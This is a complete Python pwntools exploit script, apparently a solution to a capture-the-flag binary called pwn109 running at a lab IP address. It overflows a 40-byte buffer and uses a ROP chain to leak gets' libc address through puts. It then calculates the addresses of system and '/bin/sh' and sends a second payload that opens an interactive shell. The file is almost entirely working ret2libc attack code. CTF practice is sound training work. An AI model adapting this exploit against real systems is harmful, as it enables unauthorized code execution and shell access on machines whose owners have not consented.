#!/usr/bin/python3

from pwn import *

local = True
filename = './pwn109.pwn109'
hostname = '10.10.68.145'
port = 9009
is_debug = False
eip_offest = 40

e = ELF(filename)
pop_rdi = 0x4012a3
ret = 0x40101a

'''
Get offsets
https://libc.rip/

SERVER: Leaked address of gets_got from libc: 0x7fb95cd8c190
libc6_2.27-3ubuntu1.4_amd64

LOCAL: Leaked address of gets_got from libc: 0x7f555abad970
libc6_2.31-0ubuntu9.8_amd64
'''

if local:
    gets_libc_offset = 0x83970
    system_libc_offset = 0x52290
    str_bin_sh_libc_offset = 0x1b45bd
    
    if is_debug:
        p = gdb.debug(filename, '''
        break *main+63
        continue
        ''')
    else:
        p = process(filename)
else:
    gets_libc_offset = 0x80190 # 0x70190
    system_libc_offset = 0x4f550 # 0x443d0
    str_bin_sh_libc_offset = 0x1b3e1a # 0x18c3dd
    p = remote(hostname, port)

main = e.symbols.main
puts = e.symbols.puts
print(f'main : {hex(main)}')
print(f'puts : {hex(puts)}')

gets_got = e.got.gets
print(f'gets_got : {hex(gets_got)}')

# leak gets address
payload = b"A" * eip_offest
# int puts(const char *s);
payload += p64(pop_rdi)
payload += p64(gets_got)
payload += p64(puts)
# call main again
payload += p64(main)

# recv leaked address
p.recvuntil(b"Go ahead")
p.recvline()
print('Sending payload to leak gets address and call main again')
p.sendline(payload)
leaked = p.recvline()
gets_libc = u64(leaked.strip().ljust(8, b"\x00"))
print(f'Leaked address of gets_got from libc: {hex(gets_libc)}')

# get address of libc base and system and /bin/sh string
libc_base = gets_libc - gets_libc_offset
system = libc_base + system_libc_offset
str_bin_sh = libc_base + str_bin_sh_libc_offset

print(f'libc_base : {hex(libc_base)}')
print(f'system : {hex(system)}')
print(f'str_bin_sh : {hex(str_bin_sh)}')
print('Calling main again')

# call system("/bin/sh")
payload = b"A" * eip_offest
payload += p64(pop_rdi)
payload += p64(str_bin_sh)
payload += p64(ret)
payload += p64(system)

p.recvuntil(b"Go ahead")
p.recvline()
print('Sending payload to call system')
p.sendline(payload)
p.interactive()

